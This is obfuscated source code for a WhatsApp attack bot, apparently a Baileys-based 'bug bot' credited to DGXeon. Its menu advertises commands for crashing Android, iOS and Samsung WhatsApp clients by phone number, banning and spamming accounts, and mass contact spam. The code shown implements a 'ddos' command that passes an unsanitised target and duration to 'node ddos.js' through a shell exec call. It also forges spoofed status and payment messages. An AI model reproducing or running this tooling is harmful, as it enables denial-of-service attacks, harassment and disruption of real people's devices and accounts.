//YouTube and Telegram: @DGXeon

const {
  tdxConnect,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header
} = require("@whiskeysockets/baileys");
const axios = require("axios");
const os = require("os").cpus().length;
const util = require("util");
const jimp = require("jimp");
const fetch = require("node-fetch");
const speed = require("performance-now");
const moment = require("moment-timezone");
const pino = require("pino");
const {
  spawn: spawn,
  exec
} = require("child_process");
const {
  Primbon
} = require("scrape-primbon");
const primbon = new Primbon();
const fg = require("api-dylux");
const path = require("path");
const cheerio = require("cheerio");
const ytdl = require("ytdl-core");
const chalk = require("chalk");
const {
  color
} = require("../trashbase/lib/color");
const FormData = require("form-data");
const crypto = require("crypto");
const yts = require("yt-search");
const bochil = require("@bochilteam/scraper");
const fakeUA = require("fake-useragent");
const randomUA = fakeUA().toString();
const fs = require("fs");
module.exports = tdx = handler = async (_0x8fddfa, _0x4678cc, _0x5e0753, _0x27f2c9) => {
  try {
    var _0x352abc = _0x4678cc.mtype === "conversation" ? _0x4678cc.message.conversation : _0x4678cc.mtype === "imageMessage" ? _0x4678cc.message.imageMessage.caption : _0x4678cc.mtype === "videoMessage" ? _0x4678cc.message.videoMessage.caption : _0x4678cc.mtype === "extendedTextMessage" ? _0x4678cc.message.extendedTextMessage.text : _0x4678cc.mtype === "buttonsResponseMessage" ? _0x4678cc.message.buttonsResponseMessage.selectedButtonId : _0x4678cc.mtype === "listResponseMessage" ? _0x4678cc.message.listResponseMessage.singleSelectReply.selectedRowId : _0x4678cc.mtype === "interactiveResponseMessage" ? JSON.parse(_0x4678cc.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x4678cc.mtype === "templateButtonReplyMessage" ? _0x4678cc.message.templateButtonReplyMessage.selectedId : _0x4678cc.mtype === "messageContextInfo" ? _0x4678cc.message.buttonsResponseMessage?.selectedButtonId || _0x4678cc.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x4678cc.message.interactiveResponseMessage?.nativeFlowResponseMessage || _0x4678cc.text : "";
    require("../config");
    const {
      smsg: _0x318a23,
      getGroupAdmins: _0x5f3ec7,
      formatp: _0x364645,
      h2k: _0x2a8fff,
      tanggal: _0x46a9d2,
      formatDate: _0x36326b,
      getTime: _0x58c7f4,
      isUrl: _0x1d0b5d,
      sleep: _0xa791c,
      clockString: _0x556ec9,
      msToDate: _0x5e4dc1,
      sort: _0x549a07,
      toNumber: _0x18b25b,
      enumGetKey: _0xbef3fa,
      runtime: _0x196fe8,
      fetchJson: _0x33bdc3,
      getBuffer: _0x32ee84,
      jsonformat: _0x32f2ff,
      delay: _0x3fe9a3,
      format: _0x51d95f,
      logic: _0x374d13,
      generateProfilePicture: _0x463828,
      parseMention: _0x6046e7,
      getRandom: _0x17a1de,
      pickRandom: _0x347b30
    } = require("../trashbase/lib/myfunction");
    const {
      remini: _0x59fa37
    } = require("../trashbase/lib/remini");
    const {
      radio: _0x5ca590,
      locl: _0x1be22c,
      cds: _0x2b82fa,
      listr: _0x1b58f9,
      clpm: _0x3eb929,
      caltx: _0xe35f6c,
      paym: _0x43e142,
      locm: _0x43355a,
      evm: _0x47f467
    } = require("../trashbase/lib/msg-service");
    const {
      toPTT: _0x2705b5,
      toAudio: _0x1b32d5
    } = require("../trashbase/lib/converter");
    const {
      UploadFileUgu: _0xe516dd,
      webp2mp4File: _0x47e6a1,
      floNime: _0x41c6d9,
      TelegraPh: _0x52e73f
    } = require("../trashbase/lib/uploader");
    const {
      toTelegra: _0x422427
    } = require("../trashbase/lib/upload");
    const {
      groupMembers: _0x1e20a8
    } = _0x4678cc;
    var _0x258907 = typeof _0x4678cc.text == "string" ? _0x4678cc.text : "";
    const _0xb4fe8e = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
    const _0x2fafb3 = prefa && _0xb4fe8e.test(_0x352abc) ? _0x352abc.match(_0xb4fe8e)[0] : prefa ?? global.prefix;
    const _0xdb14f2 = _0x352abc.startsWith(_0x2fafb3);
    const _0x4db331 = _0x352abc.startsWith(_0x2fafb3) ? _0x352abc.slice(_0x2fafb3.length).trim().split(/ +/).shift().toLowerCase() : "";
    const _0xd16396 = _0x352abc.trim().split(/ +/).slice(1);
    const _0xad2a33 = _0x4678cc.pushName || "No Name";
    const _0x1b2127 = q = _0xd16396.join(" ");
    const _0x39d713 = _0x4678cc.quoted || _0x4678cc;
    const _0x4f126a = _0x4678cc.sender;
    const _0xe724ae = _0x39d713.mtype == "buttonsMessage" ? _0x39d713[Object.keys(_0x39d713)[1]] : _0x39d713.mtype == "templateMessage" ? _0x39d713.hydratedTemplate[Object.keys(_0x39d713.hydratedTemplate)[1]] : _0x39d713.mtype == "product" ? _0x39d713[Object.keys(_0x39d713)[0]] : _0x4678cc.quoted ? _0x4678cc.quoted : _0x4678cc;
    const _0x2bf9d0 = (_0xe724ae.msg || _0xe724ae).mimetype || "";
    const _0x3d54f1 = _0xe724ae.msg || _0xe724ae;
    const _0x15485d = /image|video|sticker|audio/.test(_0x2bf9d0);
    const _0x488786 = await _0x8fddfa.decodeJid(_0x8fddfa.user.id);
    const _0x8e1343 = _0x4678cc.sender == _0x488786 ? true : false;
    const _0x219360 = JSON.parse(fs.readFileSync(path.resolve(__dirname, "../trashbase/dtbs/premium.json"), "utf8"));
    const _0x353f5e = JSON.parse(fs.readFileSync(path.resolve(__dirname, "../trashbase/dtbs/owner.json"), "utf8"));
    const _0x4bc4e8 = [_0x488786, ..._0x353f5e, ...global.ownMain].map(_0x37cde4 => _0x37cde4.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x4678cc.sender);
    const _0x18189b = [_0x488786, ..._0x353f5e, ..._0x219360, ...global.ownMain].map(_0x30f3d3 => _0x30f3d3.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x4678cc.sender);
    const _0x136482 = _0x4678cc.isGroup ? await _0x8fddfa.groupMetadata(_0x4678cc.chat).catch(_0x1667aa => {}) : "";
    const _0x4c75f9 = _0x4678cc.isGroup ? _0x136482.subject : "";
    const _0x121d5a = _0x4678cc.isGroup ? await _0x136482.participants : "";
    const _0x11fc57 = _0x4678cc.isGroup ? await _0x5f3ec7(_0x121d5a) : "";
    const _0x2f1e33 = _0x4678cc.isGroup ? _0x11fc57.includes(_0x488786) : false;
    const _0xb1d3ee = _0x4678cc.isGroup ? _0x11fc57.includes(_0x4678cc.sender) : false;
    const _0x5a4663 = _0x4678cc.chat.endsWith("@g.us");
    const _0x158ac4 = _0x4678cc.isGroup ? _0x136482.owner : "";
    const _0x512222 = _0x4678cc.isGroup ? (_0x158ac4 ? _0x158ac4 : _0x11fc57).includes(_0x4678cc.sender) : false;
    const _0x1a4bac = fs.readFileSync(path.resolve(__dirname, "../69/o.jpg"));
    const _0x1117bd = fs.readFileSync(path.resolve(__dirname, "../69/o.jpg"));
    const _0x972ef1 = fs.readFileSync(path.resolve(__dirname, "../69/o.jpg"));
    const _0xbe48c0 = fs.readFileSync(path.resolve(__dirname, "../69/o.jpg"));
    const _0x2d9836 = fs.readFileSync(path.resolve(__dirname, "../69/o.jpg"));
    const _0x463bf6 = fs.readFileSync(path.resolve(__dirname, "../69/p.mp4"));
    const _0x2220bb = fs.readFileSync(path.resolve(__dirname, "../69/p.mp4"));
    const _0x42afa7 = fs.readFileSync(path.resolve(__dirname, "../69/x.mp3"));
    const _0x14e12f = fs.readFileSync(path.resolve(__dirname, "../69/o.jpg"));
    const {
      tios: _0x4c0bbd,
      tiosv2: _0x27e111,
      tiosv3: _0x10ccc7
    } = require("../69/xtext1.js");
    const {
      tiv: _0x9d863
    } = require("../69/xtext2.js");
    const _0x5e2c7b = moment.tz("Asia/Kolkata").format("HH:mm:ss");
    const _0x90d23b = moment.tz("Asia/Kolkata").format("HH:mm:ss");
    const _0x1f533b = moment.tz("Asia/Kolkata").format("DD/MM/YYYY");
    const _0x27058d = moment().tz("Asia/Kolkata").format("HH:mm:ss");
    if (_0x27058d < "23:59:00") {
      var _0x363b08 = "Good Night 🌌";
    }
    if (_0x27058d < "19:00:00") {
      var _0x363b08 = "Good Evening 🌃";
    }
    if (_0x27058d < "18:00:00") {
      var _0x363b08 = "Good Evening 🌃";
    }
    if (_0x27058d < "15:00:00") {
      var _0x363b08 = "Good Afternoon 🌅";
    }
    if (_0x27058d < "11:00:00") {
      var _0x363b08 = "Good Morning 🌄";
    }
    if (_0x27058d < "05:00:00") {
      var _0x363b08 = "Good Morning 🌄";
    }
    const _0x518924 = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z");
    const _0x1c67f5 = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z");
    const _0x50d525 = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z");
    const _0x428b23 = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
    let _0x276a6f = new Date();
    let _0x29928 = new Date(0).getTime() - new Date("1 Januari 2024").getTime();
    let _0x1a3586 = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor((_0x276a6f * 1 + _0x29928) / 84600000) % 5];
    let _0x437f81 = _0x276a6f.toLocaleDateString("id", {
      weekday: "long"
    });
    let _0x43fab0 = _0x276a6f.toLocaleDateString("id", {
      day: "numeric",
      month: "long",
      year: "numeric"
    });
    if (!_0x8fddfa.public) {
      if (!_0x4bc4e8) {
        return;
      }
    }
    async function _0x4a740c(_0x41e5ea, _0x82f53, _0x10e017, _0x2b66e6 = [""], _0x10c50c = {}) {
      const {
        default: {
          Image: _0x399299
        }
      } = await import("node-webpmux");
      const _0x2160af = new _0x399299();
      const _0x5725c2 = {
        "sticker-pack-id": "parel-kntll",
        "sticker-pack-name": _0x82f53,
        "sticker-pack-publisher": _0x10e017,
        emojis: _0x2b66e6,
        "is-avatar-sticker": 1,
        ..._0x10c50c
      };
      const _0x48f7ea = _0x5725c2;
      let _0x14675d = Buffer.from([73, 73, 42, 0, 8, 0, 0, 0, 1, 0, 65, 87, 7, 0, 0, 0, 0, 0, 22, 0, 0, 0]);
      let _0x543330 = Buffer.from(JSON.stringify(_0x48f7ea), "utf8");
      let _0x201f71 = Buffer.concat([_0x14675d, _0x543330]);
      _0x201f71.writeUIntLE(_0x543330.length, 14, 4);
      await _0x2160af.load(_0x41e5ea);
      _0x2160af.exif = _0x201f71;
      return await _0x2160af.save(null);
    }
    async function _0x5e67cb(_0x32012b, _0x171008, _0x194da1, _0x368e4d = [""], _0x1d7503 = {}) {
      const _0x2b7e8a = new webp.Image();
      const _0xd676d6 = Crypto.randomBytes(32).toString("hex");
      const _0x32ab04 = {
        "sticker-pack-id": _0xd676d6,
        "sticker-pack-name": _0x171008,
        "sticker-pack-publisher": _0x194da1,
        emojis: _0x368e4d,
        ..._0x1d7503
      };
      const _0x429735 = _0x32ab04;
      let _0x1b7afb = Buffer.from([73, 73, 42, 0, 8, 0, 0, 0, 1, 0, 65, 87, 7, 0, 0, 0, 0, 0, 22, 0, 0, 0]);
      let _0x5bb909 = Buffer.from(JSON.stringify(_0x429735), "utf8");
      let _0xfb09ac = Buffer.concat([_0x1b7afb, _0x5bb909]);
      _0xfb09ac.writeUIntLE(_0x5bb909.length, 14, 4);
      await _0x2b7e8a.load(_0x32012b);
      _0x2b7e8a.exif = _0xfb09ac;
      return await _0x2b7e8a.save(null);
    }
    async function _0x272eb9(_0x84fe9e, _0xab9131, _0x143e74, _0x59ebb0 = ["🥀"], _0x29f473 = {}) {
      const {
        default: {
          Image: _0xc5b7c1
        }
      } = await import("node-webpmux");
      const _0x2f9fbd = new _0xc5b7c1();
      const _0x649c43 = {
        "sticker-pack-id": "com.snowcorp.stickerly.android.stickercontentprovider b5e7275f-f1de-4137-961f-57becfad34f2",
        "sticker-pack-name": _0xab9131,
        "sticker-pack-publisher": _0x143e74,
        emojis: _0x59ebb0,
        "is-ai-sticker": 1,
        "android-app-store-link": "https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android",
        "ios-app-store-link": "https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android",
        ..._0x29f473
      };
      const _0x49553a = _0x649c43;
      let _0x2a9c4a = Buffer.from([73, 73, 42, 0, 8, 0, 0, 0, 1, 0, 65, 87, 7, 0, 0, 0, 0, 0, 22, 0, 0, 0]);
      let _0x238759 = Buffer.from(JSON.stringify(_0x49553a), "utf8");
      let _0x438dbf = Buffer.concat([_0x2a9c4a, _0x238759]);
      _0x438dbf.writeUIntLE(_0x238759.length, 14, 4);
      await _0x2f9fbd.load(_0x84fe9e);
      _0x2f9fbd.exif = _0x438dbf;
      return await _0x2f9fbd.save(null);
    }
    let _0x1501c4 = async (_0x1dbf25, _0x383e7c, _0x1623bb) => {
      let _0x3be987 = await jimp.read(_0x1dbf25);
      let _0x4bb556 = await _0x3be987.resize(_0x383e7c, _0x1623bb).getBufferAsync(jimp.MIME_JPEG);
      return _0x4bb556;
    };
    const _0x1ddb27 = async (_0x369851, _0x599e68) => {
      const _0x3a7805 = {
        text: _0x599e68,
        key: _0x4678cc.key
      };
      const _0x48f063 = {
        react: _0x3a7805
      };
      _0x8fddfa.sendMessage(_0x369851, _0x48f063);
    };
    async function _0x2ee926(_0x3b5160) {
      const _0x2b2c02 = {
        url: _0x3b5160
      };
      const _0x4842a0 = {
        image: _0x2b2c02
      };
      const _0x1c8f9d = {
        upload: _0x8fddfa.waUploadToServer
      };
      const {
        imageMessage: _0x27b795
      } = await generateWAMessageContent(_0x4842a0, _0x1c8f9d);
      return _0x27b795;
    }
    async function _0x1804c1(_0x98ffe5) {
      const _0x309fd3 = {
        url: _0x98ffe5
      };
      const _0x5a272a = {
        image: _0x309fd3
      };
      const _0x1fe1cd = {
        upload: _0x8fddfa.waUploadToServer
      };
      const {
        videoMessage: _0x23951d
      } = await generateWAMessageContent(_0x5a272a, _0x1fe1cd);
      return _0x23951d;
    }
    async function _0x30c87e(_0x1b5121) {
      const _0x1a1b46 = {
        upload: _0x8fddfa.waUploadToServer
      };
      return await prepareWAMessageMedia(_0x1b5121, _0x1a1b46);
    }
    const _0xb7106b = _0x246068 => {
      _0x8fddfa.sendMessage(_0x4678cc.chat, {
        text: _0x246068,
        contextInfo: {
          mentionedJid: [_0x4f126a],
          forwardingScore: 9999999,
          isForwarded: true,
          externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: " " + namabot,
            body: "" + NamaOwner,
            previewType: "PHOTO",
            thumbnailUrl: "",
            thumbnail: fs.readFileSync("./XeonMedia/thumb.jpg"),
            sourceUrl: "" + linkgc
          }
        }
      }, {
        quoted: _0x4678cc
      });
    };
    const _0x3621ff = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false
      },
      message: {
        interactiveMessage: {
          header: {
            title: ""
          },
          body: {
            text: "🦄드림 가이 Xeon"
          },
          footer: {
            text: "🦄드림 가이 Xeon"
          },
          nativeFlowMessage: {
            messageParamsJson: ""
          }
        }
      }
    };
    const _0x427194 = {
      orderId: "2029",
      thumbnail: null,
      itemCount: 909,
      status: "INQUIRY",
      surface: "CATALOG",
      message: "🦄드림 가이 Xeon " + (_0x4678cc.body || _0x4678cc.mtype),
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    };
    const _0x598281 = {
      orderMessage: _0x427194
    };
    const _0x3369ba = {
      mentionedJid: _0x4678cc.sender.split,
      forwardingScore: 999,
      isForwarded: true
    };
    const _0x339359 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: _0x598281,
      contextInfo: _0x3369ba
    };
    const _0x4f7f3e = _0x339359;
    const _0x50d967 = {
      key: {
        remoteJid: "",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        paymentInviteMessage: {
          serviceType: 1,
          expiryTimestamp: 2
        }
      }
    };
    const _0x375c9a = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        videoMessage: {
          caption: "#🦄드림 가이 Xeon",
          jpegThumbnail: await _0x1501c4(_0x972ef1, 300, 300)
        }
      }
    };
    const _0x544863 = _0x4cc7b6 => {
      let _0x3b32f1 = [];
      const _0x3a12ee = fs.readdirSync(_0x4cc7b6);
      _0x3a12ee.forEach(_0x351ada => {
        const _0x30af12 = path.join(_0x4cc7b6, _0x351ada);
        if (fs.lstatSync(_0x30af12).isDirectory()) {
          const _0x41b805 = fs.readdirSync(_0x30af12);
          _0x41b805.forEach(_0x13362e => {
            const _0x647dc3 = path.join(_0x30af12, _0x13362e);
            if (_0x647dc3.endsWith(".js")) {
              try {
                delete require.cache[require.resolve(_0x647dc3)];
                const _0x5d5470 = require(_0x647dc3);
                _0x5d5470.filePath = _0x647dc3;
                _0x3b32f1.push(_0x5d5470);
              } catch (_0x402ff9) {
                console.error("Error loading plugin at " + _0x647dc3 + ":", _0x402ff9);
              }
            }
          });
        }
      });
      return _0x3b32f1;
    };
    const _0x36b903 = _0x544863(path.resolve(__dirname, "./plugin"));
    const _0x58870d = {
      tdx: _0x8fddfa,
      m: _0x4678cc,
      chatUpdate: _0x5e0753,
      store: _0x27f2c9,
      body: _0x352abc,
      require: require,
      smsg: _0x318a23,
      getGroupAdmins: _0x5f3ec7,
      formatp: _0x364645,
      h2k: _0x2a8fff,
      tanggal: _0x46a9d2,
      formatDate: _0x36326b,
      getTime: _0x58c7f4,
      isUrl: _0x1d0b5d,
      sleep: _0xa791c,
      clockString: _0x556ec9,
      msToDate: _0x5e4dc1,
      sort: _0x549a07,
      toNumber: _0x18b25b,
      enumGetKey: _0xbef3fa,
      runtime: _0x196fe8,
      fetchJson: _0x33bdc3,
      getBuffer: _0x32ee84,
      jsonformat: _0x32f2ff,
      delay: _0x3fe9a3,
      format: _0x51d95f,
      logic: _0x374d13,
      generateProfilePicture: _0x463828,
      parseMention: _0x6046e7,
      getRandom: _0x17a1de,
      pickRandom: _0x347b30,
      groupMembers: _0x1e20a8,
      budy: _0x258907,
      prefixRegex: _0xb4fe8e,
      prefix: _0x2fafb3,
      isCmd: _0xdb14f2,
      command: _0x4db331,
      args: _0xd16396,
      pushname: _0xad2a33,
      text: _0x1b2127,
      q: q,
      fatkuns: _0x39d713,
      quoted: _0xe724ae,
      mime: _0x2bf9d0,
      qmsg: _0x3d54f1,
      isMedia: _0x15485d,
      botNumber: _0x488786,
      itsMe: _0x8e1343,
      itsOrkay: _0x219360,
      kontributor: _0x353f5e,
      isDeveloper: _0x4bc4e8,
      isPremium: _0x18189b,
      groupMetadata: _0x136482,
      groupName: _0x4c75f9,
      participants: _0x121d5a,
      groupAdmins: _0x11fc57,
      isBotAdmins: _0x2f1e33,
      isAdmins: _0xb1d3ee,
      isGroup: _0x5a4663,
      groupOwner: _0x158ac4,
      isGroupOwner: _0x512222,
      time: _0x90d23b,
      ucapanWaktu: _0x363b08,
      wib: _0x518924,
      wita: _0x1c67f5,
      wit: _0x50d525,
      salam: _0x428b23,
      d: _0x276a6f,
      gmt: _0x29928,
      weton: _0x1a3586,
      week: _0x437f81,
      calender: _0x43fab0,
      dust: _0x3621ff,
      reaction: _0x1ddb27,
      xreply: _0xb7106b,
      TelegraPh: _0x52e73f,
      toTelegra: _0x422427,
      resize: _0x1501c4,
      remini: _0x59fa37,
      crtImg: _0x2ee926,
      crtVid: _0x1804c1,
      addExifAvatar: _0x272eb9,
      addExif: _0x5e67cb,
      exifAvatar: _0x4a740c,
      prM: _0x30c87e,
      rick: _0x2220bb,
      razer: _0x1a4bac,
      subaru: _0x2d9836,
      gifck: _0x463bf6,
      tios: _0x4c0bbd,
      tiosv2: _0x27e111,
      tiosv3: _0x10ccc7,
      tiv: _0x9d863,
      evm: _0x47f467,
      banner: _0xbe48c0
    };
    const _0xa7150c = _0x58870d;
    let _0x184585 = false;
    for (const _0x4a7293 of _0x36b903) {
      if (_0x4a7293.command.includes(_0x4db331)) {
        try {
          await _0x4a7293.operate(_0xa7150c);
          _0x184585 = true;
        } catch (_0x5c318e) {
          console.error("Error executing plugin " + _0x4a7293.filePath + ":", _0x5c318e);
        }
        break;
      }
    }
    if (_0x4678cc.message && _0x4678cc.isGroup) {
      console.log(chalk.cyan("\n< ================================================== >\n"));
      console.log(chalk.green("Group Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0x258907 || _0x4678cc.mtype)) + "\n" + chalk.magenta("=> From"), chalk.green(_0xad2a33), chalk.yellow(_0x4678cc.sender) + "\n" + chalk.blueBright("=> In"), chalk.green(_0x4c75f9, _0x4678cc.chat));
    } else {
      console.log(chalk.cyan("\n< ================================================== >\n"));
      console.log(chalk.green("Private Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0x258907 || _0x4678cc.mtype)) + "\n" + chalk.magenta("=> From"), chalk.green(_0xad2a33), chalk.yellow(_0x4678cc.sender));
    }
    if (!_0x184585) {
      switch (_0x4db331) {
        case "menu":
        case "help":
        case "alive":
        case "?":
        case "allmenu":
          const _0x396bcb = String.fromCharCode(8206);
          const _0x57784d = _0x396bcb.repeat(4001);
          let _0x5ae402 = "Hello " + _0xad2a33 + "\n╰┈➤ " + _0x363b08 + " 😄\n" + _0x57784d + "\n╰┈➤ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ\n> castx (number)\n> classx (number)\n> samsung_cl (number)\n> carsmsg (amount)\n\n╰┈➤ ʙᴜɢ ɪᴏꜱ\n> crashios (number)\n> gifplayback (number)\n> ipay (amount)\n\n╰┈➤ ʙᴜɢ ʀᴀɴᴅᴏᴍ\n> galaxy (number)\n> rickast (number)\n> radiob (number)\n> cards (number)\n> dropd (number)\n> flowto (number)\n> 1st (number)\n> blobx (number)\n> screen_0 (number)\n> dott\n> breaak\n> csx (amount)\n> rickr (amount)\n> call (amount)\n> 🔥 (amount)\n> 🏴‍☠️ (amount)\n\n╰┈➤ ᴀɴᴅʀᴏɪᴅ & ɪᴏꜱ\n> ext-3 (number)\n> paym (number)\n> listeresp (number)\n\n╰┈➤ ɪᴍᴍᴜɴᴇ\n> matta-immn\n\n╰┈➤ ɪᴏꜱ\n> crashios (number)\n> gifplayback (number)\n> ipay (amount)\n\n╰┈➤ ꜱᴀᴍꜱᴜɴɢ\n> samsung_cl (number)\n> classx (number)\n> castx (number)\n> carsmsg (amount)\n\n╰┈➤ ɢʀᴏᴜᴘ ᴄʜᴀᴛ\n> atk (select group)\n> getview (idgc)\n> callmsg (linkgc)\n\n╰┈➤ ʙᴜɢ ᴏᴛʜᴇʀ\n> tempban\n> xpairspam\n\n╰┈➤ ᴅᴅᴏꜱ ᴍᴇɴᴜ\n> ddos\n> checkhost\n\n╰┈➤ ʙᴀɴ/ᴜɴʙᴀɴ ᴍᴇɴᴜ\n> banv1 (in development)\n> banv2 (in development)\n> banv3 (in development)\n> banv4 (in development)\n> banv5 (in development)\n> banv6 (in development)\n> unbanv1 (in development)\n> unbanv2 (in development)\n> unbanv3 (in development)\n> unbanv4 (in development)\n> unbanv5 (in development)\n\n╰┈➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ\n> public\n> self\n> addprem\n> delprem\n> addowner\n> delowner\n> addplug\n> cgplug\n> rmplug\n> getplug\n> getq\n> join [link group]\n> leavegc\n> block [number]\n> unblock [number]\n> listblock\n> setppbot [reply img]\n> setbiobot [text]\n> listpc\n> =>\n> >\n> $\n\n╰┈➤ ɢʀᴏᴜᴘ ᴍᴇɴᴜ\n> editsubjek\n> editdesk\n> setppgroup\n> setppgc\n> linkgc\n> resetlinkgc\n> revoke\n> kick\n> add\n> promote\n> demote\n> hidetag\n> tagall\n\n╰┈➤ ꜱᴇᴀʀᴄʜ ᴍᴇɴᴜ\n> pint query\n> play query\n\n╰┈➤ ᴀɪ ᴍᴇɴᴜ\n> rimuru-ai query\n> trash-ai query\n> ai query\n\n╰┈➤ ᴠᴄꜰ ᴍᴇɴᴜ\n> pushkontak teks\n> jpm\n> jpm2\n> jpmht\n> jpmht2\n\n╰┈➤ ᴅᴏᴡɴ ᴍᴇɴᴜ\n> igdl url\n> mediafire url\n> ytmp3 url\n> ytmp4 url\n> gitclone url\n> tiktok url\n\n╰┈➤ ᴏᴛʜᴇʀ ᴍᴇɴᴜ\n> sticker\n> toimg\n> ttp text|pix\n> tts text|lang\n> smeme text1|text2\n> textmaker text1|text2\n> tesc text\n> tocc text\n> stt text\n> attp text\n> toascii text\n> qrcode text\n> barcode text\n> shorturl link\n> removebg reply img\n> remini reply img\n> calculator";
          if (typemenu === "v1") {
            const _0x134672 = {
              title: namabot,
              body: NamaOwner,
              thumbnailUrl: "https://i.ibb.co/kSs1stX/thumb.jpg",
              sourceUrl: linkgc,
              mediaType: 1,
              renderLargerThumbnail: true
            };
            const _0x571de9 = {
              externalAdReply: _0x134672
            };
            const _0x4452f3 = {
              text: _0x5ae402,
              contextInfo: _0x571de9
            };
            _0x8fddfa.sendMessage(_0x4678cc.chat, _0x4452f3, {
              quoted: _0x4678cc
            });
          } else if (typemenu === "v2") {
            _0x8fddfa.sendMessage(_0x4678cc.chat, {
              video: fs.readFileSync("./XeonMedia/thumb2.mp4"),
              gifPlayback: true,
              caption: _0x5ae402,
              contextInfo: {
                externalAdReply: {
                  title: namabot,
                  body: NamaOwner,
                  thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
                  sourceUrl: "",
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }, {
              quoted: _0x4678cc
            });
          } else if (typemenu === "v3") {
            _0x8fddfa.sendMessage(_0x4678cc.chat, {
              video: fs.readFileSync("./XeonMedia/thumb2.mp4"),
              caption: _0x5ae402,
              gifPlayback: true
            }, {
              quoted: _0x4678cc
            });
          } else if (typemenu === "v4") {
            const _0x25a3dd = {
              callType: "AUDIO",
              scheduledTimestampMs: 1200,
              title: _0x5ae402
            };
            const _0x6944ba = {
              scheduledCallCreationMessage: _0x25a3dd
            };
            _0x8fddfa.relayMessage(_0x4678cc.chat, _0x6944ba, {});
          }
          break;
        case "ddos":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!q.includes(" ")) {
              return replygcxeon("Use Methode: ." + _0x4db331 + " <target> <time>\nExaple: ." + _0x4db331 + " example.xyz 60");
            }
            const _0x1d7a75 = q.substring(0, q.indexOf(" ") - 0);
            const _0x273f82 = q.substring(q.lastIndexOf(" ") + 1);
            replygcxeon("Bot is attacking " + _0x1d7a75 + " with time " + _0x273f82);
            const _0x25b402 = {
              maxBuffer: 1048576
            };
            exec("node ddos.js " + _0x1d7a75 + " " + _0x273f82, _0x25b402, (_0x2231e8, _0x5461ad, _0xedfdb1) => {
              if (_0x2231e8) {
                replygcxeon("Error: " + _0x2231e8.message);
                return;
              }
              if (_0xedfdb1) {
                replygcxeon("Error: " + _0xedfdb1);
                return;
              }
              replygcxeon("Success\n\n🤙 target: " + _0x1d7a75 + ",\n🤙 Time: " + _0x273f82);
            });
          }
          break;
        case "checkhost":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!q) {
              return replygcxeon("Example : " + (_0x2fafb3 + _0x4db331) + " https://nxnn.com");
            }
            const _0x7d527b = {
              text: botname
            };
            const _0x48aaa3 = {
              name: "cta_url",
              buttonParamsJson: "{ display_text : 'Check Host' , url : \"https://check-host.net/check-http?host=" + q + "\", merchant_url : \"https://check-host.net/check-http?host=" + q + "\" }"
            };
            const _0x58aab8 = {
              buttons: [_0x48aaa3],
              messageParamsJson: ""
            };
            const _0x587335 = {
              header: {
                title: "",
                subtitle: "p"
              },
              body: {
                text: "Click Chech Host To Check Web"
              },
              footer: _0x7d527b,
              nativeFlowMessage: _0x58aab8
            };
            const _0x420f1a = {
              interactiveMessage: _0x587335
            };
            const _0x23639b = {
              message: _0x420f1a
            };
            const _0x3f031d = {
              viewOnceMessage: _0x23639b
            };
            let _0x5c2d8c = _0x3f031d;
            _0x8fddfa.relayMessage(_0x4678cc.chat, _0x5c2d8c, {});
          }
          break;
        case "public":
          {
            if (!_0x4bc4e8) {
              return;
            }
            _0x8fddfa.public = true;
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "self":
          {
